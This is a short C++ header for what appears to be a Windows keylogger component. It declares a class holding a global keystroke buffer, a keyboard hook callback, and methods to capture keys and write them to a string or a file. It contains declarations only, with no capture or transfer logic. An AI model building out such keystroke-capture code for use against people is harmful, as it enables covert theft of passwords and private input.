#pragma once

#include  "DataTransferObj.h"
#include <string>
#include <vector>
#include <memory>
#include <conio.h>
#include <windows.h>

std::vector<int> keylog;

class KLG_TransferObj : public DataTransferObj
{

public:
	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	// Convert data object to string type
	std::string toString() = 0;

	// Convert data object to a file
	std::string toFile(std::string filename) = 0;

	std::string keylogger();
	bool checkStopSignal();

};